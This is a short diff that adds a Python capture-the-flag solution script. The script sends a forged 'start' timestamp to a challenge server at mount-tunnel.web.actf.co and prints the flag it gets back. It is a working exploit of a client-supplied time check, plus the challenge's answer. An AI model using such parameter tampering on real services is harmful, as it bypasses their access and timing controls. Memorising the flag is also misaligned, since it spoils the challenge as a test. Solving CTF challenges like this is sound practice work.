@@ -1,0 +1,8 @@
+import requests
+
+url = 'https://mount-tunnel.web.actf.co/submit'
+
+r = requests.post(url, data={'start': 2000000000.0})      
+print(r.text)
+
+you win the flag: actf{wait_until_farewell_speedrun}
